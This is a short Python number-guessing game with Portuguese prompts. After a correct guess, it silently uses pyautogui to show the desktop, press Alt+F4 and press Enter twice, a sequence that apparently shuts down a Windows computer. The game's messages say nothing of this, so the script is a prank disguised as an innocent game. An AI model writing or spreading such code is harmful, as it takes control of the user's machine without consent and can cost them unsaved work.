import random
import pyautogui as pa
import os
import time as t

def main():
    print("Bem-vindo ao jogo de adivinhação!")
    print("Tente adivinhar um número entre 1 e 5.")

    # Gera um número aleatório entre 1 e 5
    numero_secreto = random.randint(1, 5)

    while True:
        try:
            # Solicita ao jogador para inserir um palpite
            palpite = int(input("Digite seu palpite: "))
            
            # Verifica se o palpite está correto
            if palpite == numero_secreto:
                print("Parabéns! Você acertou!")
                t.sleep(1)
                pa.hotkey('win','d')
                t.sleep(.1)
                pa.click(1,1,button='left', clicks=1, interval=0.0, duration=0.0)
                t.sleep(.1)
                pa.hotkey('alt','f4')
                t.sleep(.1)
                pa.press('enter')
                t.sleep(.3)
                pa.press('enter')

                

                break
            else:
                print("Ops! Tente novamente.")
        except ValueError:
            print("Por favor, digite um número válido.")

if __name__ == "__main__":
    main()
